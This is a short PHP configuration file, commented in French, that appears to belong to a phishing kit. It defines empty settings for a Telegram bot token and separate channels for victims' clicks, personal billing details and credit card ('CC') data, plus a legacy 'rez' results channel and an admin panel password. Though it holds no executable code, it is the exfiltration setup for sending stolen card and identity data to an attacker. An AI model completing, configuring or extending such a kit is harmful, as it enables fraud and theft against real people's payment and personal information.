<?php

declare(strict_types=1);

return [
    // Token du bot Telegram (@BotFather)
    'bot_token' => '',

    // Groupe / canal pour les clics
    'chat_id_clicks' => '',

    // Groupe / canal pour les notifications billing (informations personnelles)
    'chat_id_billing' => '',

    // Groupe / canal pour les notifications carte (CC)
    'chat_id_cc' => '',

    // Fallback legacy — utilisé si les canaux ci-dessus ne sont pas renseignés
    'chat_id_rez' => '',

    // Mot de passe du panel admin
    'panel_password' => '',

    'enabled' => true,
];
